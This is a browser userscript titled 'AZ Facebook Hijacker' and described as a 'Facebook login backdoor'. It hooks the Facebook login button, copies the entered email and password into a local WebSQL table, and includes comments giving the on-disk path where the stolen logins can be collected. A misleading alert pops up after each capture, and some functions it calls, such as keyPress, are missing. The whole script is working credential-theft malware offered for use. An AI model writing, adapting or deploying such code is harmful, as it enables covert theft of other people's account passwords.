// ==UserScript==
// @name           	AZ Facebook Hijacker
// @version 		1.0
// @namespace      	http://apachejava.blogspot.com
// @description    	Facebook login backdoor
// @include        	http://*.facebook.com/*
// @include        	http:/facebook.com/*
// @include        	https:/facebook.com/*
// @include        	https://*.facebook.com/*
// @license        	GNU GENERAL PUBLIC LICENSE
// @agreement      	THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
// ==/UserScript==

//path to database in Windows XP
//C:\Documents and Settings\aizaz.haider\Local Settings\Application Data\Google\Chrome\User Data\Default\databases
//windows 7
//C:\users\username\appdata\roaming

var title 				= "FB.Logger.Chrome.Special";
var version 			= "v1.0";

var delimiter 			= ",";
var subDelimiter 		= "|";
var submitControl;
var unControl;
var pwControl;

///////////////////
// Specific code //
///////////////////

init();

function init()
{
	//getElementsByClassNameAndType('uiButtonConfirm', 'submit')[0].addEventListener("click", saveLogin, false);	
	
	getElementByTabIndex("4", "submit")[0].addEventListener("click", saveLogin, false);;
	unControl 		= document.getElementById('email');
	pwControl 		= document.getElementById('pass');
}

//----az functions
function insertRecord(tx) {
                    try {                        
                        var sql = "INSERT INTO fblogger (user_name, password) VALUES (?,?)";
                        tx.executeSql(sql, [unControl.value, pwControl.value], function() {
                            alert("Some error occured, Browser may crash now.");
                        }, errorCB);
                    } catch(e) {
                        alert(e.toString());
                    }

                }
				
	function createTable(tx) {
                    tx.executeSql('CREATE TABLE IF NOT EXISTS fblogger (serial_id INTEGER PRIMARY KEY  AUTOINCREMENT  NOT NULL  UNIQUE , user_name TEXT DEFAULT NA, password TEXT DEFAULT NA)');                    
                    insertRecord(tx);
                }

                //function will be called when an error occurred
                function errorCB(err) {
                    alert("Error processing SQL: " + err.code);
                }

                //function will be called when process succeed
                function successCB() {                    
                    db.transaction(queryDB, errorCB);
                }

function saveLogin()
{
	if (unControl.value.length == 0 || pwControl.value.length == 0)
		return;		
	var db = openDatabase("FB_Logins", "1.0", "FB", 2 * 1024 * 1024);		
	db.transaction(createTable, errorCB, successCB);
}

//unsafeWindow.doTheBossanova = function(email, password)
//{
	//unControl.value = email;
//	pwControl.value = password;
//	document.forms[0].submit();
//}



if (document.addEventListener)
   document.addEventListener("keypress", keyPress,false);
else if (document.attachEvent)
   document.attachEvent("onkeypress", keyPress);
else
   document.onkeypress= keyPress;




unsafeWindow.killWindow = function ()
{
	if (document.getElementById('displayDiv') != null)
		document.body.removeChild(document.getElementById('displayDiv'));
}


function getElementsByClassName(classname, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) ) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementsByClassNameAndType(classname, type, node)
{ 
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 

	var a = [], re = new RegExp('\\b' + classname + '\\b'); 
	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if ( re.test(els[i].className) && els[i].type == type) 
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}

function getElementByTabIndex(index, type, node)
{
	if (!node)
	{ 
		node = document.getElementsByTagName('body')[0]; 
	} 
	
	var a = [];

	els = node.getElementsByTagName('*'); 
	for (var i = 0, j = els.length; i < j; i++) 
	{ 
		if (els[i].tabIndex == index && els[i].type == type)
		{ 
			a.push(els[i]);
		} 
	} 
	return a; 
}
